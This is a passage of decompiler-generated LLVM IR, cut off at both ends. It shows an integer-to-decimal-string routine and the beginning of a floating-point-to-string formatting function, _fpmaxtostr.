  %v1_806290a = sub i32 0, %v3_8062907
  store i32 %v1_806290a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806291e

dec_label_pc_806291e:                             ; preds = %entry, %dec_label_pc_80628ff, %dec_label_pc_8062905
  %v0_8062923 = phi i32 [ %v1_80628ff, %dec_label_pc_8062905 ], [ %v1_80628ff, %dec_label_pc_80628ff ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8062905 ], [ 0, %dec_label_pc_80628ff ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8062923
  %tmp30 = urem i32 -1, %v0_8062923
  store i8 0, i8* %arg1, align 1
  %v1_8062928 = add i32 %tmp30, 1
  %v1_8062929 = load i32, i32* %esi.global-to-local, align 4
  %v12_8062929 = icmp eq i32 %v1_8062928, %v1_8062929
  %v1_8062933 = icmp eq i1 %v12_8062929, false
  br i1 %v1_8062933, label %dec_label_pc_8062942, label %dec_label_pc_8062935

dec_label_pc_8062935:                             ; preds = %dec_label_pc_806291e
  %v1_8062935 = add i32 %div, 1
  br label %dec_label_pc_8062942

dec_label_pc_8062942:                             ; preds = %dec_label_pc_806291e, %dec_label_pc_8062935
  %stack_var_-20.0.off0 = phi i32 [ %v1_8062928, %dec_label_pc_806291e ], [ 0, %dec_label_pc_8062935 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_806291e ], [ %v1_8062935, %dec_label_pc_8062935 ]
  %v0_8062942 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8062942, i32* %ebp.global-to-local, align 4
  %v0_8062944 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8062944, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062948

dec_label_pc_8062948:                             ; preds = %dec_label_pc_8062996, %dec_label_pc_8062942
  %v0_806297f = phi i32 [ %v0_8062998, %dec_label_pc_8062996 ], [ %v0_8062942, %dec_label_pc_8062942 ]
  %v0_806294c = phi i32 [ %v1_806299a, %dec_label_pc_8062996 ], [ %v0_8062944, %dec_label_pc_8062942 ]
  %v1_8062948 = icmp eq i32 %v0_806294c, 0
  br i1 %v1_8062948, label %dec_label_pc_806297f, label %dec_label_pc_806294c

dec_label_pc_806294c:                             ; preds = %dec_label_pc_8062948
  %v0_8062950 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_806294c, %v0_8062950
  %tmp31 = urem i32 %v0_806294c, %v0_8062950
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_806297f, %v0_8062950
  %tmp32 = urem i32 %v0_806297f, %v0_8062950
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8062963 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8062967 = add i32 %tmp32, %v6_8062963
  %v8_806296d = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8062972 = add i32 %div7, %v8_806296d
  store i32 %v2_8062972, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8062967, %v0_8062950
  %tmp33 = urem i32 %v2_8062967, %v0_8062950
  %v2_806297a = add i32 %div8, %v2_8062972
  br label %dec_label_pc_8062987

dec_label_pc_806297f:                             ; preds = %dec_label_pc_8062948
  %v0_8062983 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_806297f, %v0_8062983
  %tmp34 = urem i32 %v0_806297f, %v0_8062983
  br label %dec_label_pc_8062987

dec_label_pc_8062987:                             ; preds = %dec_label_pc_806294c, %dec_label_pc_806297f
  %v13_806298d = phi i32 [ %tmp33, %dec_label_pc_806294c ], [ %tmp34, %dec_label_pc_806297f ]
  %storemerge = phi i32 [ %v2_806297a, %dec_label_pc_806294c ], [ %div10, %dec_label_pc_806297f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8062987 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062987 = add i32 %v0_8062987, -1
  store i32 %v1_8062987, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_806298d, 10
  br i1 %tmp, label %dec_label_pc_806298d, label %dec_label_pc_8062992

dec_label_pc_806298d:                             ; preds = %dec_label_pc_8062987
  %v2_806298d = add i32 %v13_806298d, 48
  %v12_806298d = and i32 %v2_806298d, 255
  %v14_806298d = and i32 %v13_806298d, -256
  %v15_806298d = or i32 %v12_806298d, %v14_806298d
  br label %dec_label_pc_8062996

dec_label_pc_8062992:                             ; preds = %dec_label_pc_8062987
  %v6_8062992 = add i32 %v13_806298d, %arg5
  %v21_8062992 = and i32 %v6_8062992, 255
  %v23_8062992 = and i32 %v13_806298d, -256
  %v24_8062992 = or i32 %v21_8062992, %v23_8062992
  br label %dec_label_pc_8062996

dec_label_pc_8062996:                             ; preds = %dec_label_pc_806298d, %dec_label_pc_8062992
  %storemerge9 = phi i32 [ %v15_806298d, %dec_label_pc_806298d ], [ %v24_8062992, %dec_label_pc_8062992 ]
  %v1_8062996 = trunc i32 %storemerge9 to i8
  %v3_8062996 = inttoptr i32 %v1_8062987 to i8*
  store i8 %v1_8062996, i8* %v3_8062996, align 1
  %v0_8062998 = load i32, i32* %ebp.global-to-local, align 4
  %v1_806299a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806299a = or i32 %v1_806299a, %v0_8062998
  %v3_806299a = icmp eq i32 %v2_806299a, 0
  %v1_806299c = icmp eq i1 %v3_806299a, false
  br i1 %v1_806299c, label %dec_label_pc_8062948, label %dec_label_pc_806299e

dec_label_pc_806299e:                             ; preds = %dec_label_pc_8062996
  %v4_806299e = icmp eq i32 %storemerge11, 0
  br i1 %v4_806299e, label %dec_label_pc_80629a9, label %dec_label_pc_80629a5

dec_label_pc_80629a5:                             ; preds = %dec_label_pc_806299e
  %v0_80629a5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80629a5 = add i32 %v0_80629a5, -1
  store i32 %v1_80629a5, i32* %edi.global-to-local, align 4
  %v1_80629a6 = inttoptr i32 %v1_80629a5 to i8*
  store i8 45, i8* %v1_80629a6, align 1
  br label %dec_label_pc_80629a9

dec_label_pc_80629a9:                             ; preds = %dec_label_pc_806299e, %dec_label_pc_80629a5
  %v0_80629ac = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_80629ac

; uselistorder directives
  uselistorder i32 %v13_806298d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8062967, { 1, 0 }
  uselistorder i32 %v0_8062950, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_806294c, { 1, 0, 2 }
  uselistorder i32 %v0_806297f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8062928, { 1, 0 }
  uselistorder i32 %v0_8062923, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 255, { 1, 0, 4, 5, 6, 8, 7, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80629a9, { 1, 0 }
  uselistorder label %dec_label_pc_8062996, { 1, 0 }
  uselistorder label %dec_label_pc_8062987, { 1, 0 }
  uselistorder label %dec_label_pc_8062942, { 1, 0 }
  uselistorder label %dec_label_pc_806291e, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_3()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80629b5 = load i32, i32* @edi, align 4
  %v0_80629b6 = load i32, i32* @esi, align 4
  %v0_80629b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80629b7, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_80629cc = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80629cc = add i3 %v4_80629cc, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_80629cc, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80629d3 = add i32 %tmp156, 4
  %v2_80629d3 = inttoptr i32 %v1_80629d3 to i32*
  %v3_80629d3 = load i32, i32* %v2_80629d3, align 4
  store i32 %v3_80629d3, i32* %eax.global-to-local, align 4
  %v1_80629da = add i32 %tmp156, 8
  %v2_80629da = inttoptr i32 %v1_80629da to i8*
  %v3_80629da = load i8, i8* %v2_80629da, align 1
  %v4_80629da = zext i8 %v3_80629da to i32
  %v6_80629da = and i32 %v0_80629b7, -256
  %v7_80629da = or i32 %v4_80629da, %v6_80629da
  store i32 %v7_80629da, i32* %ebx.global-to-local, align 4
  %v1_80629dd = inttoptr i32 %tmp156 to i32*
  %v2_80629dd = load i32, i32* %v1_80629dd, align 4
  store i32 %v2_80629dd, i32* %ebp.global-to-local, align 4
  %v2_80629e9 = or i8 %v3_80629da, 32
  %v7_80629e9 = zext i8 %v2_80629e9 to i32
  %v9_80629e9 = and i32 %v3_80629d3, -256
  %v10_80629e9 = or i32 %v7_80629e9, %v9_80629e9
  store i32 %v10_80629e9, i32* %eax.global-to-local, align 4
  %v10_80629eb = icmp eq i8 %v2_80629e9, 97
  %v1_80629f1 = icmp eq i1 %v10_80629eb, false
  br i1 %v1_80629f1, label %dec_label_pc_80629fa, label %dec_label_pc_80629f3

dec_label_pc_80629f3:                             ; preds = %entry
  %v2_80629f3 = add i8 %v3_80629da, 6
  %v15_80629f3 = zext i8 %v2_80629f3 to i32
  %v18_80629f3 = or i32 %v15_80629f3, %v6_80629da
  store i32 %v18_80629f3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80629fa

dec_label_pc_80629fa:                             ; preds = %entry, %dec_label_pc_80629f3
  %stack_var_-207.0 = phi i8 [ %v3_80629da, %entry ], [ %v2_80629f3, %dec_label_pc_80629f3 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8062a01 = icmp slt i32 %v2_80629dd, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8062a10 = select i1 %v2_8062a01, i32 6, i32 %v2_80629dd
  store i32 %v3_8062a10, i32* %ebp.global-to-local, align 4
  %v1_8062a13 = add i32 %tmp156, 12
  %v2_8062a13 = inttoptr i32 %v1_8062a13 to i32*
  %v3_8062a13 = load i32, i32* %v2_8062a13, align 4
  store i32 %v3_8062a13, i32* %eax.global-to-local, align 4
  %v2_8062a16 = and i32 %v3_8062a13, 2
  %v3_8062a16 = icmp eq i32 %v2_8062a16, 0
  br i1 %v3_8062a16, label %dec_label_pc_8062a24, label %dec_label_pc_8062a30

dec_label_pc_8062a24:                             ; preds = %dec_label_pc_80629fa
  %v2_8062a24 = urem i32 %v3_8062a13, 2
  %tmp192 = trunc i32 %v2_8062a24 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8062a30

dec_label_pc_8062a30:                             ; preds = %dec_label_pc_8062a24, %dec_label_pc_80629fa
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80629fa ], [ %tmp193, %dec_label_pc_8062a24 ]
  %not.v5_8062a30 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8062a30, label %dec_label_pc_8062aa7, label %dec_label_pc_8062a52

dec_label_pc_8062a52:                             ; preds = %dec_label_pc_8062a30
  %v1_8062a52 = add i3 %v4_80629cc, -2
  store i3 %v1_8062a52, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8062a56 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8062a56, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8062a52
  br label %dec_label_pc_8062ae2

bb180:                                            ; preds = %dec_label_pc_8062a52
  %v5_8062a56 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8062a56, label %bb181, label %dec_label_pc_8062a5a

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8062ae2

dec_label_pc_8062a5a:                             ; preds = %bb180
  %not.v4_8062a54 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8062a54, label %dec_label_pc_8062ae2, label %dec_label_pc_8062b77

dec_label_pc_8062aa7:                             ; preds = %dec_label_pc_8062a30
  store i3 %v4_80629cc, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8062aae = add i32 %tmp156, 16
  %v2_8062aae = inttoptr i32 %v1_8062aae to i32*
  store i32 32, i32* %v2_8062aae, align 4
  %v4_8062ab5 = add i8 %stack_var_-207.0, -96
  %v6_8062ab5 = sub i8 95, %stack_var_-207.0
  %v7_8062ab5 = and i8 %v6_8062ab5, %stack_var_-207.0
  %v8_8062ab5 = icmp slt i8 %v7_8062ab5, 0
  %v9_8062ab5 = icmp eq i8 %v4_8062ab5, 0
  %v10_8062ab5 = icmp slt i8 %v4_8062ab5, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8062aca = icmp eq i1 %v10_8062ab5, %v8_8062ab5
  %v4_8062aca = icmp eq i1 %v9_8062ab5, false
  %v5_8062aca = and i1 %v4_8062aca, %v3_8062aca
  br i1 %v5_8062aca, label %dec_label_pc_8062ad1, label %dec_label_pc_8062acc

dec_label_pc_8062acc:                             ; preds = %dec_label_pc_8062aa7
  br label %dec_label_pc_8062ad1

dec_label_pc_8062ad1:                             ; preds = %dec_label_pc_8062aa7, %dec_label_pc_8062acc
  %v2_8062ad9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8062ad9, i32* @ecx, align 4
  br label %dec_label_pc_8062ea2

dec_label_pc_8062ae2:                             ; preds = %dec_label_pc_8062a5a, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8062afc = xor i3 %v4_80629cc, -4
  store i3 %v3_8062afc, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8062b02

dec_label_pc_8062b02:                             ; preds = %dec_label_pc_8062b53, %dec_label_pc_8062ae2
  %v0_8062b53 = phi i32 [ 4096, %dec_label_pc_8062ae2 ], [ %v2_8062b53, %dec_label_pc_8062b53 ]
  %v2_8062b05 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8062ae2 ], [ %v2_8062b0581, %dec_label_pc_8062b53 ]
  %v1_8062b3d = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8062ae2 ], [ %v0_8062b0279, %dec_label_pc_8062b53 ]
  %v0_8062b4f66 = phi i32 [ 13, %dec_label_pc_8062ae2 ], [ %v1_8062b04, %dec_label_pc_8062b53 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8062ae2 ], [ %stack_var_-220.1, %dec_label_pc_8062b53 ]
  %v1_8062b04 = add i32 %v0_8062b4f66, -1
  %v4_8062b05 = fcmp ule x86_fp80 %v1_8062b3d, %v2_8062b05
  br i1 %v4_8062b05, label %dec_label_pc_8062b2c, label %dec_label_pc_8062b09

dec_label_pc_8062b09:                             ; preds = %dec_label_pc_8062b02
  store x86_fp80 %v1_8062b3d, x86_fp80* %st0.global-to-local, align 4
  %v3_8062b0b = mul i32 %v1_8062b04, 12
  store i32 %v3_8062b0b, i32* %eax.global-to-local, align 4
  %v1_8062b0e = add i32 %v3_8062b0b, ptrtoint (x86_fp80** @global_var_806f360.808 to i32)
  %v2_8062b0e = inttoptr i32 %v1_8062b0e to x86_fp80*
  %v3_8062b0e = load x86_fp80, x86_fp80* %v2_8062b0e, align 4
  %v4_8062b14 = fmul x86_fp80 %v1_8062b3d, %v3_8062b0e
  store x86_fp80 %v4_8062b14, x86_fp80* %st1.global-to-local, align 4
  %v4_8062b18 = fcmp ule x86_fp80 %v4_8062b14, %v3_8062b0e
  br i1 %v4_8062b18, label %dec_label_pc_8062b4d, label %dec_label_pc_8062b1c

dec_label_pc_8062b1c:                             ; preds = %dec_label_pc_8062b09
  store x86_fp80 %v4_8062b14, x86_fp80* %st1.global-to-local, align 4
  %v5_8062b26 = sub i32 %stack_var_-220.0, %v0_8062b53
  br label %dec_label_pc_8062b4f

dec_label_pc_8062b2c:                             ; preds = %dec_label_pc_8062b02
  %v3_8062b2c = mul i32 %v1_8062b04, 12
  store i32 %v3_8062b2c, i32* %eax.global-to-local, align 4
  %v1_8062b2f = add i32 %v3_8062b2c, ptrtoint (x86_fp80** @global_var_806f360.808 to i32)
  %v2_8062b2f = inttoptr i32 %v1_8062b2f to x86_fp80*
  %v3_8062b2f = load x86_fp80, x86_fp80* %v2_8062b2f, align 4
  %v4_8062b35 = fdiv x86_fp80 %v3_8062b2f, %v1_8062b3d
  store x86_fp80 %v4_8062b35, x86_fp80* %st1.global-to-local, align 4
  %v4_8062b37 = fcmp ogt x86_fp80 %v3_8062b2f, %v1_8062b3d
  br i1 %v4_8062b37, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8062b2c
  store x86_fp80 %v3_8062b2f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8062b3d

bb183:                                            ; preds = %dec_label_pc_8062b2c
  %v5_8062b37 = fcmp olt x86_fp80 %v3_8062b2f, %v1_8062b3d
  br i1 %v5_8062b37, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8062b2f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8062b4d

bb184:                                            ; preds = %bb183
  %not.v6_8062b37 = fcmp une x86_fp80 %v3_8062b2f, %v1_8062b3d
  store x86_fp80 %v3_8062b2f, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8062b37, label %dec_label_pc_8062b4d, label %dec_label_pc_8062b3d

dec_label_pc_8062b3d:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8062b2f, x86_fp80* %st1.global-to-local, align 4
  %v5_8062b47 = add i32 %stack_var_-220.0, %v0_8062b53
  br label %dec_label_pc_8062b4f

dec_label_pc_8062b4d:                             ; preds = %dec_label_pc_8062b09, %.thread51, %bb184
  %v1_8062b4d = phi x86_fp80 [ %v1_8062b3d, %.thread51 ], [ %v1_8062b3d, %bb184 ], [ %v3_8062b0e, %dec_label_pc_8062b09 ]
  %v0_8062b0280 = phi x86_fp80 [ %v3_8062b2f, %.thread51 ], [ %v3_8062b2f, %bb184 ], [ %v4_8062b14, %dec_label_pc_8062b09 ]
  store x86_fp80 %v1_8062b4d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8062b4f

dec_label_pc_8062b4f:                             ; preds = %dec_label_pc_8062b3d, %dec_label_pc_8062b1c, %dec_label_pc_8062b4d
  %v2_8062b0581 = phi x86_fp80 [ %v1_8062b4d, %dec_label_pc_8062b4d ], [ %v2_8062b05, %dec_label_pc_8062b3d ], [ %v1_8062b3d, %dec_label_pc_8062b1c ]
  %v0_8062b0279 = phi x86_fp80 [ %v0_8062b0280, %dec_label_pc_8062b4d ], [ %v3_8062b2f, %dec_label_pc_8062b3d ], [ %v4_8062b14, %dec_label_pc_8062b1c ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8062b4d ], [ %v5_8062b47, %dec_label_pc_8062b3d ], [ %v5_8062b26, %dec_label_pc_8062b1c ]
  %v1_8062b4f = icmp eq i32 %v1_8062b04, 0
  br i1 %v1_8062b4f, label %.thread60, label %dec_label_pc_8062b53

dec_label_pc_8062b53:                             ; preds = %dec_label_pc_8062b4f
  %v2_8062b53 = sdiv i32 %v0_8062b53, 2
  store i32 %v2_8062b53, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062b02

.thread60:                                        ; preds = %dec_label_pc_8062b4f
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8062b77

dec_label_pc_8062b77:                             ; preds = %dec_label_pc_8062a5a, %.thread60
  %v0_8062c31 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8062a5a ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8062a5a ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8062b7b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8062a52, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8062b8e = and i32 %v2_8062b7b, -65536
  %v1_8062b93 = udiv i16 %tmp146, 256
  %v2_8062b93 = zext i16 %v1_8062b93 to i32
  %v3_8062b93 = or i32 %v2_8062b93, 12
  %v10_8062b93 = mul nuw nsw i32 %v3_8062b93, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8062b8e.masked = zext i16 %tmp194 to i32
  %v11_8062b93 = or i32 %v10_8062b93, %v4_8062b8e.masked
  %v12_8062b93 = or i32 %v11_8062b93, %v6_8062b8e
  store i32 %v12_8062b93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062b9b

dec_label_pc_8062b9b:                             ; preds = %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge, %dec_label_pc_8062b77
  %v2_8062bc0 = phi x86_fp80 [ %storemerge, %dec_label_pc_8062b77 ], [ %v2_8062bc0.pre, %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge ]
  %v1_8062b9b = phi i3 [ %v1_8062a52, %dec_label_pc_8062b77 ], [ %v1_8062b9b.pre, %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge ]
  %v3_8062bc2 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8062b77 ], [ %v0_8062b9b.pre, %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8062b7b, %dec_label_pc_8062b77 ], [ %v4_8062bbb, %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8062bc2 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8062bb5 = sitofp i32 %tmp195 to x86_fp80
  %v4_8062bbb = add i32 %stack_var_-212.0, 9
  %v4_8062bc0 = fsub x86_fp80 %v2_8062bc0, %v5_8062bb5
  store i3 %v1_8062b9b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8062bc2 = fmul x86_fp80 %v3_8062bc2, %v4_8062bc0
  store x86_fp80 %v4_8062bc2, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8062bc4

dec_label_pc_8062bc4:                             ; preds = %dec_label_pc_8062bc4.dec_label_pc_8062bc4_crit_edge, %dec_label_pc_8062b9b
  %v0_8062bd8 = phi i32 [ %v0_8062bd8.pre, %dec_label_pc_8062bc4.dec_label_pc_8062bc4_crit_edge ], [ %tmp195, %dec_label_pc_8062b9b ]
  %v0_8062bc8 = phi i32 [ %v0_8062bc8.pre, %dec_label_pc_8062bc4.dec_label_pc_8062bc4_crit_edge ], [ 0, %dec_label_pc_8062b9b ]
  %v1_8062bc8 = add i32 %v0_8062bc8, 1
  store i32 %v1_8062bc8, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8062bd2 = sub i32 %v4_8062bbb, %v1_8062bc8
  %div = udiv i32 %v0_8062bd8, 10
  %tmp185 = urem i32 %v0_8062bd8, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8062bde = and i32 %div, 536870656
  store i32 %v2_8062bd2, i32* %edx.global-to-local, align 4
  %v1_8062be4 = trunc i32 %tmp185 to i8
  %v2_8062be4 = or i8 %v1_8062be4, 48
  %v12_8062be4 = zext i8 %v2_8062be4 to i32
  %v15_8062be4 = or i32 %v12_8062be4, %v3_8062bde
  store i32 %v15_8062be4, i32* %eax.global-to-local, align 4
  %v3_8062be9 = inttoptr i32 %v2_8062bd2 to i8*
  store i8 %v2_8062be4, i8* %v3_8062be9, align 1
  %v7_8062beb = icmp sgt i32 %v1_8062bc8, 8
  br i1 %v7_8062beb, label %dec_label_pc_8062bed, label %dec_label_pc_8062bc4.dec_label_pc_8062bc4_crit_edge

dec_label_pc_8062bc4.dec_label_pc_8062bc4_crit_edge: ; preds = %dec_label_pc_8062bc4
  %v0_8062bc8.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8062bd8.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062bc4

dec_label_pc_8062bed:                             ; preds = %dec_label_pc_8062bc4
  %v0_8062bed = load i32, i32* @edi, align 4
  %v1_8062bed = add i32 %v0_8062bed, 1
  store i32 %v1_8062bed, i32* @edi, align 4
  %v7_8062bf1 = icmp sgt i32 %v1_8062bed, 2
  br i1 %v7_8062bf1, label %dec_label_pc_8062bf3, label %dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge

dec_label_pc_8062bed.dec_label_pc_8062b9b_crit_edge: ; preds = %dec_label_pc_8062bed
  %v0_8062b9b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8062b9b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8062bc0.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8062b9b

dec_label_pc_8062bf3:                             ; preds = %dec_label_pc_8062bed
  %v0_8062bf3 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8062bf3 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8062bf3, x86_fp80* %st0.global-to-local, align 4
  %v2_8062bf5 = add i3 %v0_8062bf3, 2
  store i3 %v2_8062bf5, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8062bf7 = add i8 %stack_var_-207.0, -96
  %v6_8062bf7 = sub i8 95, %stack_var_-207.0
  %v7_8062bf7 = and i8 %v6_8062bf7, %stack_var_-207.0
  %v8_8062bf7 = icmp slt i8 %v7_8062bf7, 0
  %v9_8062bf7 = icmp eq i8 %v4_8062bf7, 0
  %v10_8062bf7 = icmp slt i8 %v4_8062bf7, 0
  %v3_8062bfc = icmp eq i1 %v10_8062bf7, %v8_8062bf7
  %v4_8062bfc = icmp eq i1 %v9_8062bf7, false
  %v5_8062bfc = and i1 %v4_8062bfc, %v3_8062bfc
  br i1 %v5_8062bfc, label %dec_label_pc_8062c0b, label %dec_label_pc_8062bfe

dec_label_pc_8062bfe:                             ; preds = %dec_label_pc_8062bf3
  %v4_8062bfe = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8062c0b

dec_label_pc_8062c0b:                             ; preds = %dec_label_pc_8062bf3, %dec_label_pc_8062bfe
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8062bf3 ], [ %v4_8062bfe, %dec_label_pc_8062bfe ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8062bf3 ], [ 69, %dec_label_pc_8062bfe ]
  %v12_8062c0b = icmp eq i8 %stack_var_-207.1, 103
  %v1_8062c10 = icmp eq i1 %v12_8062c0b, false
  br i1 %v1_8062c10, label %dec_label_pc_8062c19, label %dec_label_pc_8062c12

dec_label_pc_8062c12:                             ; preds = %dec_label_pc_8062c0b
  %v0_8062c12 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8062c12, 1
  br i1 %tmp186, label %dec_label_pc_8062c20, label %dec_label_pc_8062c16

dec_label_pc_8062c16:                             ; preds = %dec_label_pc_8062c12
  %v1_8062c16 = add i32 %v0_8062c12, -1
  store i32 %v1_8062c16, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8062c20

dec_label_pc_8062c19:                             ; preds = %dec_label_pc_8062c0b
  %v12_8062c19 = icmp eq i8 %stack_var_-207.1, 102
